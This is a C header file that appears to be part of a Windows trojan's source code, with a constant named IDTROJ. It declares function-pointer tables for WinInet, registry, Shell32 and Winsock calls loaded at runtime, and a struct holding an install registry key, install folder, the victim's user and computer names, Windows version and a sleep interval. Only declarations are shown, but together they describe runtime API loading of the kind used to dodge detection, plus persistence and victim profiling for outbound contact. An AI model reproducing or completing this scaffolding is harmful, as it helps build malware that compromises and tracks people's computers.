#if !defined(LOADDLL_H__36DB8046_25CF_412B_8619_391C20E99D42__INCLUDED_)
#define LOADDLL_H__36DB8046_25CF_412B_8619_391C20E99D42__INCLUDED_

#include <windows.h>
#include <wininet.h>

#define IDTROJ 123
#define MAXPATH 512
typedef struct _DLLHANDLER {
        HINSTANCE hWinInet;
        HINSTANCE hAdvApi32;
        HINSTANCE hShell32;
        HINSTANCE hSocket;
} DLLHANDLER;

typedef bool (WINAPI *fnINTERNETGETCONNECTEDSTATE)(LPDWORD lpdwFlags,DWORD dwReserved);
typedef bool (WINAPI *fnINTERNETAUTODIAL)(DWORD dwFlags, DWORD dwReserved);
typedef bool (WINAPI *fnINTERNETAUTODIALHANGUP)(DWORD dwReserved);
typedef HINTERNET (WINAPI *fnINTERNETCONNECT) (HINTERNET hInternet,LPCTSTR lpszServerName, INTERNET_PORT nServerPort, LPCTSTR lpszUsername, LPCTSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
typedef HINTERNET (WINAPI *fnINTERNETOPEN)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxyName, LPCSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET (WINAPI *fnINTERNETOPENURL)(HANDLE hInternetSession, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD dwContext);
typedef bool (WINAPI *fnHTTPQUERYINFO)(HINTERNET hHttpRequest, DWORD wInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef bool (WINAPI *fnINTERNETREADFILE)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead);
typedef bool (WINAPI *fnINTERNETCLOSEHANDLE)(HINTERNET hInet);
typedef HINTERNET (WINAPI *fnHTTPOPENREQUEST) (HINTERNET hConnect, LPCTSTR lpszVerb, LPCTSTR lpszObjectName, LPCTSTR lpszVersion, LPCTSTR lpszReferer, LPCTSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
typedef bool (WINAPI *fnHTTPSENDREQUEST)(HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
typedef bool (WINAPI *fnHTTPQUERYINFO) (HINTERNET hRequest,  DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef bool (WINAPI *fnINTERNETQUERYOPTION) (HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, LPDWORD lpdwBufferLength);
typedef bool (WINAPI *fnINTERNETSETOPTION) (HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
typedef bool (WINAPI *fnINTERNETSETCOOKIE) (LPCTSTR lpszUrl, LPCTSTR lpszCookieName, LPCTSTR lpszCookieData);
typedef bool (WINAPI *fnHTTPADDREQUESTHEADERS) (HINTERNET hConnect, LPCTSTR lpszHeaders, INT dwHeadersLength, DWORD dwModifiers);
typedef LONG (WINAPI *fnREGOPENKEYEX) (HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LONG (WINAPI *fnREGQUERYVALUEEX) (HKEY hKey, LPCTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef LONG (WINAPI *fnREGOPENKEY) (HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *fnREGCREATEKEY) (HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult);
typedef LONG (WINAPI *fnREGSETVALUEEX)(HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef LONG (WINAPI *fnREGCLOSEKEY) (HKEY hKey);
typedef BOOL (WINAPI *fnGETUSERNAME) (LPTSTR lpBuffer, LPDWORD lpnSize);
typedef bool (WINAPI *fnGETCOMPUTERNAME)(LPTSTR lpBuffer,LPDWORD lpnSize);

typedef int (WSAAPI *fnWSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI *fnWSASOCKET)(int af, int type, int protocol, LPWSAPROTOCOL_INFO lpProtocolInfo, GROUP g, DWORD dwFlags);
typedef int (WSAAPI *fnWSACLEANUP)(void);
typedef int (WSAAPI *fnCLOSESOCKET)(SOCKET s);
typedef int (WSAAPI *fnCONNECT)(SOCKET s, const struct sockaddr *name, int namelen);
typedef u_short (WSAAPI *fnHTONS) (u_short hostshort);
typedef unsigned long (WSAAPI *fnINET_ADDR) ( const char *cp);

typedef BOOL (WINAPI *fnSHGETSPECIALFOLDERPATH) (HWND hwndOwner,LPTSTR lpszPath,int csidl,BOOL fCreate);


typedef struct _API {
        fnINTERNETGETCONNECTEDSTATE pInternetGetConnectedState;
        fnINTERNETCONNECT pInternetConnect;
        fnHTTPOPENREQUEST pHttpOpenRequest;
        fnINTERNETAUTODIAL pInternetAutodial;
        fnINTERNETAUTODIALHANGUP pInternetAutoDialHangup;
        fnINTERNETOPEN pInternetOpen;
        fnINTERNETOPENURL pInternetOpenUrl;
        fnINTERNETREADFILE pInternetReadFile;
        fnINTERNETCLOSEHANDLE pInternetCloseHandle;
        fnHTTPSENDREQUEST pHttpSendRequest;
        fnHTTPQUERYINFO pHttpQueryInfo;
        fnINTERNETQUERYOPTION pInternetQueryOption;
        fnINTERNETSETOPTION pInternetSetOption;
        fnINTERNETSETCOOKIE pInternetSetCookie;
        fnHTTPADDREQUESTHEADERS pHttpAddRequestHeaders;
        
        fnREGOPENKEYEX pRegOpenKeyEx;
        fnREGQUERYVALUEEX pRegQueryValueEx;
        fnREGOPENKEY pRegOpenKey;
        fnREGCREATEKEY pRegCreateKey;
        fnREGSETVALUEEX pRegSetValueEx;
        fnREGCLOSEKEY pRegCloseKey;
        fnGETUSERNAME pGetUserName;
        fnGETCOMPUTERNAME pGetComputerName;
        fnSHGETSPECIALFOLDERPATH pSHGetSpecialFolderPath;
        
        fnWSASTARTUP pWSAStartup;
        fnWSASOCKET pWSASocket;
        fnWSACLEANUP pWSACleanUP;
        fnCLOSESOCKET pCloseSocket;
        fnCONNECT pConnect;
        fnHTONS pHtons;
        fnINET_ADDR pInet_Addr;
        
        
        int idTroj;
        char sInstalledKey[MAXPATH];
        char sInstalledRep[MAXPATH];
        char sTmpDirectory[MAXPATH];
        char sWindowsVersion[MAXPATH];
        char sComputerName[MAX_PATH];
        char sUserName[MAX_PATH];   
        long lTimeToSleep;
} API;

int loadLibraryWinInet(DLLHANDLER *pHandler, API *pApi);
int loadLibraryAdvAPI32(DLLHANDLER *pHandler, API *pApi);
int loadLibraryShell32(DLLHANDLER *pHandler, API *pApi);
int loadLibrarySocket(DLLHANDLER *pHandler, API *pApi);
void freeLibraries(DLLHANDLER *pHandler);
#endif
